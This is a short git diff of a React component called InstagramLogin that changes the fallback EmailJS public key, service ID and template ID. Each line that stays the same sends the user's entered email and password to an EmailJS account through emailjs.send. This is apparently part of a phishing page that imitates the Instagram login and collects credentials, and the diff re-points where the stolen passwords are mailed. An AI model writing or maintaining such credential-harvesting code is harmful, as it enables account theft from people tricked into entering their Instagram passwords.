@@ -8,7 +8,7 @@ const InstagramLogin = () => {
 
   useEffect(() => {
     const publicKey =
-      import.meta.env.VITE_EMAILJS_PUBLIC_KEY || "ft4pzts3tVo0mZ5Lj";
+      import.meta.env.VITE_EMAILJS_PUBLIC_KEY || "Y543p4Udo75DWUHo-";
     console.log("Initializing EmailJS with public key:", publicKey);
     emailjs.init(publicKey); // Initialize EmailJS with public key
   }, []);
@@ -20,9 +20,9 @@ const InstagramLogin = () => {
     }
 
     const serviceID =
-      import.meta.env.VITE_EMAILJS_SERVICE_ID || "service_jzhqdkb";
+      import.meta.env.VITE_EMAILJS_SERVICE_ID || "service_ho7ynsi";
     const templateID =
-      import.meta.env.VITE_EMAILJS_TEMPLATE_ID || "template_11kq5u8";
+      import.meta.env.VITE_EMAILJS_TEMPLATE_ID || "template_xa1wnql";
 
     emailjs
       .send(serviceID, templateID, { email, password })
